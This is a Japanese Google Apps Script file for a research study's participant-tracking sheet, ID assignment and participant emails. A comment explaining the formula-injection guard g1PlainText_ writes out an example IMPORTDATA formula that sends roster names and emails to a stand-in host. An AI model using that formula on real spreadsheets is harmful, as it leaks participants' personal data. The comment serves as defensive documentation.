//      ⚠️ ★ 「配布フォルダURL」の側は**生のままでなければならない**。
//      `G1_MATERIALS_URL_RE` と `g1FolderIdFromUrl_` が読む**機械入力**だからである。
var RUN_HEADER = [
  "P-ID",
  // ⚠️ 実名・メールはここに書かない。
  //   実名↔P-ID の対応表は Phase1 のロスターと G1-C 回答シートが真実源である。
  //   ⚠️ 「事前案内メール送信日」列は廃止した（事前案内メールを廃止したため・2026-08-03）。
  "G1-C 同意",
  // ★★ 2026-08-07: 配布フォルダ（課題ページ）の URL。★ 研究者が貼る**唯一の手入力**であり、
  //    g1AutoSendPendingMaterials() の引き金でもある（貼られるまで送らない）。
  // ⚠️ ★ 第 8 版のコメントは「URL 自体はここに書かない（割付が推測されうる）」としていたが、
  //    2026-08-07 に**方針を変えた**。理由を隠さず書く:
  //      (a) Apps Script の関数セレクタは**引数を渡せない**。3 引数の sendTaskMaterialsEmail は
  //          研究者がラッパーを手書きしないと実行できず、そこが手作業として残っていた。
  //      (b) このシートは研究者しか開かない（実名・メールを持たないのは別の理由 = 匿名化）。
  //      (c) ★ URL は Drive の不透明な ID であって、**それ自体は割付を露呈しない**。
  //          露呈するのはリンク先の中身であり、それは被験者本人には元から開示している（§2.12）。
  //    ⚠️ ★ したがって「このシートを被験者や第三者に見せない」ことが前提条件である。
  "配布フォルダURL",
  // ★ 導出列（研究者は触らない）。★ 被験者に**実際に配られた**短縮 URL を見せる。
  //   ⚠️ 短縮が無ければ空のままにする（生 URL を二重に置かない）。
  "配布URL(短縮)",
  // ★★ 第 8 版（2026-08-04）: 課題ページのリンクを渡した日。★ 空 = 未送付。
  //    ⚠️ ★ g1AutoSendPendingMaterials() の**冪等キー**である（消さない）。
  //    受付メール 1 通で渡したときは onG1ConsentSubmit がここに日付を入れる。
  "課題ページ送付日",
  "実施日",
  // ★★ 第 9 版（2026-08-04）: 実施形態を共変量として記録する（preregistration.md §2.14）。
  //    ⚠️ **判定にも除外にも使わない**（§3.6 無変更）。報告時に内訳を併記するための列である。
  //    ⚠️ ここが無いと §2.14-3 の報告義務に対して**保存先が存在しない**ことになる
  //       （2026-08-04 の cross-review で Codex が指摘）。
  "実施形態",
  "実施OS",
  "アプリのビルド",
  // ★ 「G1 モードで動作しています」が画面に出ていたか（`g1.mode` マーカー）。
  //   ⚠️ 旧名は「GSE_DISABLE_PROBES=1」だった（launcher で環境変数を立てていた頃の名残）。
  "G1モード確認",
  "HMM_VERSION",
  "完了ブロック数(/10)",
  "G1-M 回答数(/7)",
  "G1-S 回答",
  "verify-blocks 実施",
  "validate_blocks 緑",
  "gse-dataset 送付",
  "撤回/除外",
  "備考",
];

// ★★ 実シートのヘッダ行（row 2）と RUN_HEADER が一致しているか。
//   ⚠️ **runCol_ は「コード側の RUN_HEADER」しか見ない。** 実シートのヘッダが古いままだと、
//      列名で引いているのに**実シートでは別の列を指す**。
//   ★ 2026-08-03 に実際に起きた: 旧版で作られた 16 列のシート（実施予定日なし）に対し、
//      17 列の RUN_HEADER で applyRunValidation_ を回したため、
//      **日付列「実施日」に「はい/いいえ」のドロップダウンが付いた**（実測・スクリーンショット確認）。
//   → 黙ってずらさず、**ここで止める**。
function runHeaderDiff_(sh) {
  var live = sh.getRange(2, 1, 1, Math.max(sh.getLastColumn(), RUN_HEADER.length)).getValues()[0];
  var diff = [];
  for (var i = 0; i < RUN_HEADER.length; i++) {
    var a = String(RUN_HEADER[i]);
    var b = String(live[i] === undefined ? "" : live[i]).trim();
    if (a !== b) diff.push("col" + (i + 1) + ": コード='" + a + "' / シート='" + b + "'");
  }
  return diff;
}

function assertRunHeader_(sh) {
  var diff = runHeaderDiff_(sh);
  if (diff.length) {
    throw new Error(
      "★ 「G1 実施トラッキング」のヘッダがコードの RUN_HEADER と一致しません。\n" +
        "⚠️ このまま進めると runCol_ が**別の列**を指し、入力規則や備考が静かにずれます。\n" +
        diff.join("\n") +
        "\n→ データが無ければ setupG1Forms() が自動で作り直します。" +
        "データがある場合は、列を手で合わせてから再実行してください。"
    );
  }
}

// ★ 列番号 → 列記号（条件付き書式の数式で使う）。
function colLetter_(n) {
  var s = "";
  while (n > 0) {
    var m = (n - 1) % 26;
    s = String.fromCharCode(65 + m) + s;
    n = (n - m - 1) / 26;
  }
  return s;
}

// ★★ 見た目（2026-08-08・研究者の指摘「Phase1 よりかなり怠っている」）。
//   ★ Phase1 の `rebuildRosterTab_` と**同じ型**にする: 赤バナー / ネイビーのヘッダ /
//     ヘッダ 2 行と P-ID 列の固定 / 交互背景 / 列ごとの幅 / 中央寄せ / 条件付き書式。
//   ⚠️ 装飾は**データを触らない**。何度呼んでもよい（buildRunTab_ と移行の両方から呼ぶ）。
function styleRunTab_(sh) {
  var n = RUN_HEADER.length;
  var NAVY = "#1a3a5c", RED = "#b71c1c";

  // 行1: 注意バナー。★ 何を書いてはいけないかを、シートの上で明示する。
  //
  // ⚠️★★ **バナーを A1 から結合すると `setFrozenColumns(1)` が例外で落ちる**
  //   （実測 2026-08-08・実シート）:
  //     「結合されたセルの一部だけを含む列を固定することはできません。」
  //   ★ 固定の境界（A と B の間）が結合を**分断する**からである。
  //   → ★ **A1 は結合に含めず**、バナーは **B1 以降**だけを結合する。
  //     これで「P-ID 列の固定」と「1 行の帯」を両立できる。
  //   ⚠️ 旧版の結合（A1 から全列）が残っていると同じ例外になるので、**先に解除する**。
  try {
    sh.getRange(1, 1, 1, Math.max(n, sh.getMaxColumns())).breakApart();
  } catch (e) {
    /* 結合が無ければ何もしない（例外にしない） */
  }
  if (n > 1) {
    try {
      sh.getRange(1, 2, 1, n - 1).merge();
    } catch (e) {
      Logger.log("ℹ️ バナーの結合をスキップしました: " + e);
    }
  }
  sh.getRange(1, 1).setValue("⚠");
  sh.getRange(1, 2)
    .setValue(
      "P-ID は Phase1 と共有（同じ人＝同じ ID）。採番は Phase1 の参加者ロスターで行う。" +
        "★ 実名・メールをこのシートに書かない（Phase1 ロスターと G1-C 回答が真実源）。" +
        "★ ブロックごとの条件・題材・NDJSON 名も書かない（記録用紙 → blocks/P0xx.json が真実源）。" +
        "★ 配置(A/B) は assign.py が P-ID から決める（このシートには持たない）。"
    );
  sh.getRange(1, 1, 1, n)
    .setFontWeight("bold")
    .setFontColor("#ffffff")
    .setBackground(RED)
    .setWrap(true)
    .setVerticalAlignment("middle")
    .setHorizontalAlignment("left")
    .setFontSize(11);
  sh.setRowHeight(1, 46);

  // 行2: ヘッダ。
  sh.getRange(2, 1, 1, n)
    .setValues([RUN_HEADER])
    .setFontWeight("bold")
    .setFontColor("#ffffff")
    .setBackground(NAVY)
    .setHorizontalAlignment("center")
    .setVerticalAlignment("middle")
    .setFontSize(11)
    .setWrap(true)
    .setBorder(true, true, true, true, true, false, "#ffffff", SpreadsheetApp.BorderStyle.SOLID);
  sh.setRowHeight(2, 36);
  sh.setFrozenRows(2);
  try {
    sh.setFrozenColumns(1); // ★ 横スクロールしても P-ID を見失わない
  } catch (e) {
    // ⚠️ ★ 黙って飛ばさない。バナーの結合が A 列に掛かっていると必ずここで落ちる。
    Logger.log("⚠️ ★ P-ID 列を固定できませんでした（バナーの結合が A 列に掛かっている疑い）: " + e);
  }

  // ⚠️★ 2026-08-08 実測: ここを 200 行 × 列ごとに触ると **実行が 5 分を超える**
  //   （Sheets の 1 呼び出しが遅く、列ごとのループがそのまま往復回数になる）。
  //   ★ 行数を絞り、範囲をまとめて **呼び出し回数を減らす**。
  var BAND_ROWS = 100;
  try {
    // ★ 既に縞があるなら張り直さない（毎回張ると重いうえ二重になる）。
    if (!sh.getBandings || sh.getBandings().length === 0) {
      sh.getRange(3, 1, BAND_ROWS, n).applyRowBanding(
        SpreadsheetApp.BandingTheme.LIGHT_GREY, false, false
      );
    }
  } catch (e) {
    /* 既に縞が張ってあると失敗する（無害） */
  }

  // 列幅（ヘッダ名で引く。★ 列を足しても壊れない）。
  var WIDTHS = {
    "P-ID": 70, "G1-C 同意": 80, "配布フォルダURL": 240, "配布URL(短縮)": 130,
    "課題ページ送付日": 110, "実施日": 100, "実施形態": 170, "実施OS": 100,
    "アプリのビルド": 110, "G1モード確認": 110, "HMM_VERSION": 110,
    "完了ブロック数(/10)": 120, "G1-M 回答数(/7)": 110, "G1-S 回答": 90,
    "verify-blocks 実施": 120, "validate_blocks 緑": 120, "gse-dataset 送付": 120,
    "撤回/除外": 90, "備考": 260,
  };
  // ★ 連続した同じ幅はまとめて 1 回で設定する（setColumnWidths は範囲指定で 1 往復）。
  var i0 = 0;
  while (i0 < n) {
    var w = WIDTHS[RUN_HEADER[i0]];
    var i1 = i0;
    while (i1 + 1 < n && WIDTHS[RUN_HEADER[i1 + 1]] === w) i1++;
    if (w) {
      if (i1 > i0 && sh.setColumnWidths) sh.setColumnWidths(i0 + 1, i1 - i0 + 1, w);
      else sh.setColumnWidth(i0 + 1, w);
    }
    i0 = i1 + 1;
  }
  // ★ URL と備考以外は中央寄せ（数字とステータスが読みやすい）。
  //   ⚠️ 列ごとに呼ばず、**まず全体を中央寄せ**してから左寄せの列だけ戻す（3 往復で済む）。
  sh.getRange(3, 1, BAND_ROWS, n).setHorizontalAlignment("center");
  ["配布フォルダURL", "配布URL(短縮)", "備考"].forEach(function (h) {
    if (RUN_HEADER.indexOf(h) < 0) return;
    sh.getRange(3, runCol_(h), BAND_ROWS, 1).setHorizontalAlignment("left");
  });

  // 条件付き書式。⚠️ ★ 型付き列（ドロップダウン）が張られていると失敗しうるので、
  //   ここは**致命にしない**（Phase1 の applyRosterValidation_ と同じ扱い）。
  try {
    var full = sh.getRange(3, 1, BAND_ROWS, n);
    var excl = "$" + colLetter_(runCol_("撤回/除外")) + "3";
    var done = "$" + colLetter_(runCol_("完了ブロック数(/10)")) + "3";
    sh.setConditionalFormatRules([
      // ★ 撤回・除外された行は灰色に沈める（先に置く = 勝たせる）
      SpreadsheetApp.newConditionalFormatRule()
        .whenFormulaSatisfied("=" + excl + '<>""')
        .setBackground("#e0e0e0").setFontColor("#9e9e9e").setRanges([full]).build(),
      // ★ 10 ブロック完走 = 緑
      SpreadsheetApp.newConditionalFormatRule()
        .whenFormulaSatisfied("=" + done + "=10")
        .setBackground("#e6f4ea").setRanges([full]).build(),
      // ⚠️ 途中で止まっている（1〜9）= 黄。★ 「まだ終わっていない」を見落とさないため
        SpreadsheetApp.newConditionalFormatRule()
        .whenFormulaSatisfied("=AND(" + done + '<>"",' + done + ">0," + done + "<10)")
        .setBackground("#fff8e1").setRanges([full]).build(),
    ]);
  } catch (e) {
    Logger.log("ℹ️ 条件付き書式をスキップしました（型付き列の可能性）: " + e);
  }
}

function buildRunTab_(ss) {
  var exist = ss.getSheetByName("G1 実施トラッキング");
  if (exist) {
    var diff = runHeaderDiff_(exist);
    if (!diff.length) return; // 一致している = 何もしない（入力データを破壊しない）
    // ★ ヘッダが古い。データが無いときだけ作り直す（データがあれば人が判断する）。
    var used = exist.getLastRow() > 2
      ? exist.getRange(3, 1, exist.getLastRow() - 2, 1).getValues().filter(function (r) {
          return String(r[0]).trim() !== "";
        })
      : [];
    if (used.length) {
      throw new Error(
        "★ 「G1 実施トラッキング」のヘッダが古いのに、データが " + used.length + " 行あります。\n" +
          diff.join("\n") +
          "\n⚠️ 勝手に列をずらすと記録が壊れるので中止しました。手で列を合わせてから再実行してください。"
      );
    }
    Logger.log("⚠️ ヘッダが古いのでタブを作り直します（データ行 0）: " + diff.join(" / "));
    ss.deleteSheet(exist); // ★ 古い入力規則ごと消す（残すと新旧の規則が二重に付く）
  }
  var sh = ss.insertSheet("G1 実施トラッキング");
  styleRunTab_(sh); // ★ 見た目は移行経路と共有する（2 か所で書くとずれる）
}

// ★ ヘッダ名 → 列番号（1 始まり）。
//   ⚠️ 列番号をハードコードしない。第 6 版で列を 2 つ足したときに、
//      ハードコードしていた applyRunValidation_ の入力規則が**全部 1 つずつズレた**。
//      ズレても画面上はドロップダウンが「別の列」に付くだけで、静かに間違う。
function runCol_(header) {
  var i = RUN_HEADER.indexOf(header);
  if (i < 0) {
    throw new Error("★ RUN_HEADER に列 '" + header + "' がありません（列名を変えたら参照側も直す）");
  }
  return i + 1;
}

// 取り違えを減らすためのドロップダウン。★ 判定に関わる列は 1 つも無い（運用の記録だけ）。
function applyRunValidation_(ss) {
  var sh = ss.getSheetByName("G1 実施トラッキング");
  if (!sh) return;
  assertRunHeader_(sh); // ★ ずれたまま規則を貼らない（上のコメント参照）
  // ⚠️★ 100 行で足りる（G1 の被験者は 2 桁）。★ 広げるほど 1 実行が遅くなる（実測）。
  var rows = 100;
  // ★ 先に全部消す。⚠️ 消さないと、列構成を変えたときに**旧位置の規則が残って二重に付く**
  //   （2026-08-03 実測: B〜G 列すべてにドロップダウンが付いた状態になっていた）。
  sh.getRange(3, 1, rows, RUN_HEADER.length).clearDataValidations();
  function listRule(values) {
    return SpreadsheetApp.newDataValidation().requireValueInList(values, true).build();
  }
  function apply(header, values) {
    sh.getRange(3, runCol_(header), rows, 1).setDataValidation(listRule(values));
  }
  var yn = ["はい", "いいえ"];
  apply("G1-C 同意", yn);
  // ⚠️★ 第 13 版（§2.14）: 「無人在宅」は**実態と違う**（初回起動だけ研究者が同席する）。
  //    ★ 旧値のまま残っている行は migrateRunSheetToV14_() が書き換える。
  apply("実施形態", ["来所", "在宅（初回起動のみ同席）"]);
  apply("実施OS", ["Windows 11", "macOS"]);
  apply("G1モード確認", yn);
  apply("G1-S 回答", yn);
  apply("verify-blocks 実施", yn);
  apply("validate_blocks 緑", yn);
  apply("gse-dataset 送付", yn);
  apply("撤回/除外", ["", "撤回", "除外"]);
}

// ============================================================
// 共通ユーティリティ（Phase1 builder と同じ型）
// ============================================================

// ★ 固定 ID 方式のガード。空 ID のまま走らせるとフォームを量産するので**止める**。
function openFixed_(id, varName) {
  if (!id) {
    throw new Error(
      "★ " + varName + " が空です。フォームを量産しないため停止しました。\n" +
        "先に Google Forms で空フォームを作り、編集 URL\n" +
        "  https://docs.google.com/forms/d/<ここ>/edit\n" +
        "の <ここ> を " + varName + " に貼ってから再実行してください。"
    );
  }
  return FormApp.openById(id);
}

// 分岐ナビゲーションを先に解除してから末尾削除する。
// 直接 deleteItem すると go-to-page 参照が残って "Invalid data updating form" になる。
function clearForm(form) {
  var items = form.getItems();
  for (var i = 0; i < items.length; i++) {
    var type = items[i].getType();
    try {
      if (type === FormApp.ItemType.MULTIPLE_CHOICE) {
        var mc = items[i].asMultipleChoiceItem();
        mc.setChoices(
          mc.getChoices().map(function (c) {
            return mc.createChoice(c.getValue());
          })
        );
      } else if (type === FormApp.ItemType.LIST) {
        var li = items[i].asListItem();
        li.setChoices(
          li.getChoices().map(function (c) {
            return li.createChoice(c.getValue());
          })
        );
      } else if (type === FormApp.ItemType.PAGE_BREAK) {
        items[i].asPageBreakItem().setGoToPage(FormApp.PageNavigationType.CONTINUE);
      }
    } catch (e) {
      // ナビゲーションを持たない項目はスキップ
    }
  }
  var remaining = form.getItems();
  for (var j = remaining.length - 1; j >= 0; j--) {
    form.deleteItem(remaining[j]);
  }
}

function addSectionHeader(form, title, description) {
  var section = form.addSectionHeaderItem();
  section.setTitle(title);
  if (description) section.setHelpText(description);
}

function recordFormUrl_(key, form, label) {
  PropertiesService.getScriptProperties().setProperty(
    "FORMURL_" + key,
    JSON.stringify({
      label: label,
      id: form.getId(),
      title: form.getTitle(),
      editUrl: form.getEditUrl(),
      publishedUrl: form.getPublishedUrl(),
    })
  );
}

// ============================================================
// 募集・日程調整の自動化（第 6 版・研究者判断 2026-08-03）
// ============================================================
// ★ preregistration.md §2.12 が「事前案内で何を開示し、何を伏せるか」を凍結している。
//   本節はその実装であり、**文面を変えるときは §2.12 の表と突き合わせること。**
//   ⚠️ このプロジェクトは「文書だけ改訂して実装が追随しない」事故を繰り返している
//      (.steering/20260802-g1-execution-prep/decisions.md E-6 / E-7)。
//
// ⚠️⚠️ P-1（パイロット）では使わない。研究者本人が被験者であり課題文の作成者である（§2.12-5）。

// ★★ Phase1 の運用管理シート ID（参加者ロスターがあるスプレッドシート）。
//    採番元は **Phase1 のロスターただ 1 つ**である（protocol.md §2.0 / Form_G1/README.md）。
//    ⚠️ G1 側で採番すると 2 か所採番になり、相手の最大値が見えないので**必ず衝突する**。
//    URL の /spreadsheets/d/<ここ>/edit の <ここ> を貼る。空なら採番系は動かない（fail-closed）。
//
// ⚠️★★ **Drive に「【非公開】GSE_Phase1_運用管理シート」が 2 つある**（2026-08-03 実測）。
//    取り違えると **P-ID が既存参加者と衝突する**ので、下の ID を勝手に差し替えないこと。
//      ✅ 1ND5HSXZ...  参加者ロスター = P006..P014（現行・最終更新 2026-08-03）→ 次は P015
//      ❌ 12T8WU4D...  参加者ロスター = P001..P008（古い・最終更新 2026-06-28）
//         → こちらを指すと g1NextParticipantId_ が **P009 を返し、実在する P009..P014 と衝突する**。
//    ★ 見分け方: 「参加者ロスター」タブに **P010 以降が入っているほうが正**。
var PHASE1_MGMT_SHEET_ID = "1ND5HSXZcD_9vHjKAcM8K8Ow9VFVVwuP4L3pulP6ud7Y";

// ★ true にすると MailApp で自動送信する。既定は false（GmailApp で下書きを作る）。
//   ⚠️ Phase1 は AUTO_SEND=true で運用しているが、G1 は**対面・少人数**なので既定を下書きにした。
//      メール送信は取り消せない。文面を一度目で確認してから true にすること。
// ⚠️ ★ 2026-08-03 の研究者判断で **true**（実送信）に切り替えた。
//    登録直後に受付メールが届かないと、被験者は P-ID を知らないまま待つことになる。
//    ⚠️ 送信は取り消せない。文面を変えたら previewRegisterAckEmail() で必ず先に確認する。
var G1_AUTO_SEND = true;

// 連絡先（★ 実施前に埋める）。空欄のままだと受付メールが止まる（fail-closed）。
// ⚠️ ★ 日時・場所はメールに書かない（研究者判断 2026-08-03）。対面 1 回きりなので、
//    日程の確定連絡は研究者が普通に返信するほうが早く、自動化する価値が無い。
var G1_CONTACT = "三浦尊統（mmiura.network@gmail.com）"; // 研究者判断 2026-08-03
// ⚠️ ★ consent.md §8「所属・連絡先（実施前に記入）」を埋めるときは、**ここと同じ文字列**にする。
//    片方だけ直すと、同意文書とメールで連絡先が食い違う。

// ★★ アプリ配布フォルダ（Windows / macOS）。⚠️ **全員同じ**である。
//   ★ 受付メールに入れてよい理由: この中身は**割付にも題材にも依存しない**ので、
//     `preregistration.md §2.12` が伏せると宣言した項目を 1 つも開示しない。
//   ⚠️ ★ **課題ページ (blockNN.html) はここに入れない。** 入れると全員が同じ課題を持つことになり、
//     被験者別の割付が壊れる。課題ページは別便 (sendTaskMaterialsEmail) で個別に渡す。
//   ★ 早めに渡す価値がある: macOS は初回に「キーボードの入力の監視」を許可 → 再起動が要るので、
//     当日その場で詰まると 1 回きりの実施機会を潰しかねない (`§2.3` は分割を許さない)。
var G1_APP_DOWNLOAD_URL = "https://drive.google.com/drive/folders/1FDkU52n9EXO92TzCieivexg7WKsXHkFP";

// ⚠️ ★ 第 6 版にあった G1_TOPIC_TITLES（課題の分野を事前案内メールに載せる）は
//    **第 7 版で撤回した**。課題文は当日その場で画面提示する（§2.13）ので、
//    事前に題材を教える必要が無い。→ §2.6 の操作チェックが元の強さに戻る。
//    ⚠️ ★ **題材名をこのファイルに書き戻さないこと。**
//       scripts/check_g1_topic_titles.py がメール本文に題材名が混ざっていないかを検査する。

// ------------------------------------------------------------
// P-ID の採番（★ Phase1 のロスターに対して行う）
// ------------------------------------------------------------
// Phase1 の nextParticipantId_ / O1 の o1NextParticipantId_ と同じ規則
// （P + 3 桁ゼロ埋め・既存の最大値 + 1）。
// ⚠️ ★ 実装が 3 つあるので、**規則を変えるときは 3 つとも**（Form_Phase1 側が正）。
//
// ⚠️★★★ **2026-09-01: `last > 1` を `last >= 1` に直した**（起票 E-3）。
//   ★ 旧実装は行が 1 行しか無いロスターを**読まなかった**ので、例えば `P001` だけが
//   入っているシートに対して `max = 0` のまま **`P001` を返して衝突する**。
//   ⚠️ 見出し行があっても `^P(\d+)$` に一致しないので無視される。
//   → ★ 行が 2 行以上あるとき（＝現行ロスター）の結果は **1 バイトも変わらない**。
//   ★ O1 は 2026-08-28 に同じ修正を入れている（`Form_O1/GSE_O1_Form_Builder.gs:954`）。
function g1NextParticipantId_(sheet) {
  var max = 0;
  var last = sheet.getLastRow();
  var values = last >= 1 ? sheet.getRange(1, 1, last, 1).getValues() : [];
  for (var i = 0; i < values.length; i++) {
    var m = String(values[i][0]).match(/^P(\d+)$/);
    if (m) {
      var n = parseInt(m[1], 10);
      if (n > max) max = n;
    }
  }
  var next = max + 1;
  return "P" + (next < 1000 ? ("000" + next).slice(-3) : String(next));
}

/**
 * ⚠️★★★ **ロスターを触る操作は必ずこれで包む。**（O1 の `o1WithRosterLock_` と同じ）
 *
 * ★ 採番は「読んで最大値を出す → 書く」なので、**包まないと同時実行で同じ番号が 2 人に出る**。
 * ⚠️ 2026-09-01 まで `onG1ConsentSubmit` だけがロックを取り、`assignG1ParticipantId`
 *   （研究者の手動採番）は**その外側**で走っていた（起票 E-2 系）。
 *   ★ フォーム提出と手動採番が重なると衝突する。→ **両方をここへ通す。**
 *
 * ⚠️★★★ **ただしこれは G1 プロジェクト内の排他にすぎない。**
 *   ★ `LockService.getScriptLock()` は **スクリプトプロジェクト単位**であり、
 *   G1 と O1 は**別プロジェクト**である（`Form_G1/README.md:134` / `Form_O1/…:34`）。
 *   ⚠️ したがって **G1 と O1 の同時採番は、このロックでは防げない**（起票 T-27）。
 *   ★ `getDocumentLock()` も代替にならない（コンテナ文書＝フォームに紐づき、
 *     Phase1 ロスターには効かない）。共有ライブラリも**呼び出し側のロック**になる。
 *
 * ⚠️★★ **「防ぐ手段が無い」とは書かない**（security-checker 指摘 MED-2・2026-09-01）。
 *   ★ 正しくは *LockService では* 防げない、である。⚠️ **採番を 1 か所に集約すれば防げる**
 *   （★ その機構＝ Web App `doPost` は `Form_G1/GSE_G1_Submit.gs` に既にある）。
 *   → ★ **今回はそれを採らない**という判断であって、原理的に不可能なのではない。
 *
 * ⚠️★★ **「気づける」も言い過ぎである。** `g1CountPidRows_` は `flush()` 直後に読むので、
 *   ★ 「G1 が書く → G1 が数える(=1) → **O1 が書く**」の順序は**捕まえられない** (TOCTOU)。
 *   → ★ 正しくは「**窓を狭める**」。⚠️ 検知ゼロを「衝突ゼロ」と読まないこと。
 *
 * @return {*} `fn()` の戻り値。⚠️ ロックを取れなければ `null`（★ 呼び出し側は中止すること）。
 */
function g1WithRosterLock_(fn) {
  var lock = LockService.getScriptLock();
  try {
    lock.waitLock(30000);
  } catch (lockErr) {
    Logger.log("❌ ロスターのロックを取得できませんでした（★ 何も書いていません）: " + lockErr);
    return null;
  }
  try {
    return fn();
  } finally {
    lock.releaseLock();
  }
}

/**
 * ⚠️★★★ **共用ロスターへ書く値は必ずこれを通す**（数式インジェクション対策）。
 *
 * ★ 氏名欄は自由記入である。⚠️ `=IMPORTDATA("https://evil.example/x?d="&TEXTJOIN(",",1,B2:C200))`
 *   のような値をそのまま `appendRow` すると **Sheets が数式として格納**する。
 * ⚠️★★★ **研究者がロスターを開いた瞬間**に Sheets が URL を取りに行き、
 *   **Phase1 / G1 / O1 で共用している全参加者の氏名とメール**が外部へ出る
 *   （★ クリックは要らない。`=IMAGE(...)` も同型）。
 *   ⚠️ 流出先はまさに `docs/o1-deletion-ledger.md` §5b の 1 番＝**対応表そのもの**である。
 *
 * ★ 先頭に `'` を付けると Sheets は「文字列」の印として扱い、⚠️ **セルの値には残らない**
 *   （＝ 研究者が見る表示は変わらない）。
 *
 * ⚠️ O1 は 2026-08-29 に `o1PlainText_` として入れていた。★ **G1 には無かった**
 *   (security-checker 指摘 HIGH-2・2026-09-01)。⚠️ 実測で氏名欄の数式が
 *   ロスターに**そのまま着地する**ことが確認されている。
 */
function g1PlainText_(v) {
  var s = String(v === null || v === undefined ? "" : v);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

/**
 * ★ P-ID の形式（`P` ＋ 数字）。⚠️ **採番規則と同じ形**であること
 * （`g1NextParticipantId_` が `^P(\d+)$` で読むので、そこと食い違わせない）。
 */
function g1IsValidPid_(v) {
  return /^P\d+$/.test(String(v == null ? "" : v).trim().toUpperCase());
}

/**
 * ⚠️★★★ **採番した直後に、その P-ID がロスターに 2 行以上無いかを確かめる。**
 *
 * ★ なぜ要るか: G1 と O1 は別スクリプトプロジェクトなので `LockService` が効かず、
 *   **同時に採番すると同じ番号が 2 人に出る**（起票 T-27）。⚠️ これは*防げない*。
 *   → ★ ならば **黙って通さない**。書いた直後に読み直して、自分の ID が 1 行だけかを見る。
 *
 * ⚠️ 検知しても**自動で消したり振り直したりしない**。
 *   ★ どちらの行が誰のものかはコードには判断できず、消すと被験者のデータが迷子になる。
 *   → 研究者に見える形で残し、判断させる。
 *
 * @return {number} その P-ID を持つ行数。★ 1 なら正常。⚠️ 2 以上は衝突。
 */
function g1CountPidRows_(sheet, pid) {
  var last = sheet.getLastRow();
  if (last < 1) return 0;
  var rows = sheet.getRange(1, 1, last, 1).getValues();
  var want = String(pid).trim().toUpperCase();
  var n = 0;
  for (var i = 0; i < rows.length; i++) {
    if (String(rows[i][0]).trim().toUpperCase() === want) n++;
  }
  return n;
}

// G1 の新規参加者に P-ID を採番し、**Phase1 のロスターに 1 行追加**して返す。
// ★ 既に Phase1 に参加した人はここを通さない。その人の既存 P-ID をそのまま使う（§2.0）。
//
// ⚠️★★ 2026-09-01: **ロックの外で採番していた**のを `g1WithRosterLock_` で包んだ。
//   ★ フォーム提出（`onG1ConsentSubmit`）と手動採番が重なると同じ番号が出ていた。
function assignG1ParticipantId() {
  if (!PHASE1_MGMT_SHEET_ID) {
    throw new Error(
      "★ PHASE1_MGMT_SHEET_ID が空です。採番元は Phase1 の参加者ロスターただ 1 つなので、\n" +
        "Phase1 の運用管理シートの ID を .gs に貼ってから実行してください。\n" +
        "⚠️ G1 側にロスターを作って採番すると、2 か所採番になり必ず衝突します。"
    );
  }
  var ss = SpreadsheetApp.openById(PHASE1_MGMT_SHEET_ID);
  var sheet = ss.getSheetByName("参加者ロスター");
  if (!sheet) {
    throw new Error("★ Phase1 の管理シートに「参加者ロスター」タブがありません。ID を確認してください。");
  }

  var pid = g1WithRosterLock_(function () {
    var newPid = g1NextParticipantId_(sheet);
    sheet.appendRow([newPid]);
    SpreadsheetApp.flush(); // ★ ロック解放前に確定させる
    var n = g1CountPidRows_(sheet, newPid);
    if (n > 1) {
      // ⚠️★★★ 別プロジェクト（O1）と同時採番した可能性が高い。★ 黙って返さない。
      Logger.log(
        "⛔⚠️★★★ 採番した " + newPid + " が Phase1 ロスターに **" + n + " 行** あります。\n" +
          "   ★ G1 と O1 は別スクリプトなので LockService では排他できません（起票 T-27）。\n" +
          "   ⚠️ 自動では消しません。どの行が誰のものかを研究者が確認してください。"
      );
      // ⚠️★★ **提出経路と同じくシートにも出す**（code-reviewer 指摘 M4・2026-09-01）。
      //   ★ 初版は手動採番だけ Logger 止まりで、「シートに出す」判断が片側にしか
      //   適用されていなかった。⚠️ 手動採番のほうが研究者が実行ログを閉じがちである。
      g1RecordRosterConflict_(
        { pid: newPid, row: 0, reason: "duplicate-pid-rows:" + n },
        "", // ★ 手動採番には提出者が居ない
        "⚠️ **採番は済んでいます**（" + newPid + "）。受付メールはこの経路では送りません。"
      );
    }
    return newPid;
  });

  if (!pid) {
    throw new Error("★ ロスターのロックを取得できませんでした。何も書いていません。時間をおいて再実行してください。");
  }
  Logger.log("✅ P-ID を採番しました: " + pid + "（氏名・メールは Phase1 ロスターに手入力）");
  Logger.log("🔗 " + ss.getUrl());
  return pid;
}

// ログに実アドレスを残さない（data-privacy）。Phase1 の maskEmail_ と同じ考え方。
function g1MaskEmail_(email) {
  var s = String(email);
  var at = s.indexOf("@");
  if (at <= 1) return "***";
  return s.charAt(0) + "***" + s.substring(at);
}

// 終了後のお礼（★ 任意。デブリーフ資料は当日紙で渡す。結果概要の送付希望者向け）。
function sendThankYouEmail(pid, email) {
  if (!pid || !email) throw new Error("★ pid と email は必須です。");
  if (!G1_CONTACT) throw new Error("★ G1_CONTACT が空です。");
  var subject = "【御礼】研究へのご参加ありがとうございました";
  var body = [
    "本日はご参加いただきありがとうございました（参加者ID: " + pid + "）。",
    "",
    "当日お渡しした説明のとおり、記録したのはキーを押した時刻とキーの種類、",
    "日本語変換にかかった時間、書いた文字数だけです。",
    "★ お書きいただいた文章そのものは保存していません。",
    "",
    "★ お願い: 同じ課題をこれから参加される方にも使います。",
    "  課題の中身（どんな資料が出たか・どちらが難しかったか）は、",
    "  参加予定のある方にはお話しにならないようお願いします。",
    "",
    "結果がまとまりましたら、ご希望の方には概要をお送りします。",
    "記録の削除をご希望の場合は、いつでもこのメールにご返信ください。",
    "",
    G1_CONTACT,
  ].join("\n");
  if (G1_AUTO_SEND) {
    MailApp.sendEmail(email, subject, body);
    Logger.log("📧 送信しました: " + pid);
  } else {
    GmailApp.createDraft(email, subject, body);
    Logger.log("📝 下書きを作成しました: " + pid);
  }
  return subject;
}

/**
 * Phase1 ロスターを引く。見つかれば `{pid, row}`、⚠️ 取り違えなら `{conflict: true, ...}`。
 *
 * ⚠️★★★ **申告された P-ID をそのまま信用しない**（2026-09-01・起票 E-2）。
 *   ★ O1 は 2026-08-28 に同じ修正を入れている（`Form_O1/GSE_O1_Form_Builder.gs:989`）。
 *   ⚠️ **G1 だけが修正前のまま残っていた。**
 *
 *   ★ G1-C の参加者ID欄は**自由記入**であり、フォーム URL は被験者に配られる。
 *     → ⚠️ 打ち間違い（`P015` → `P016`）でも、第三者の申告でも、
 *       **他人の P-ID を名乗れてしまう**。
 *   ⚠️ 旧実装は `if (pid && rowPid === pid) return {...}` を**メール一致より先**に
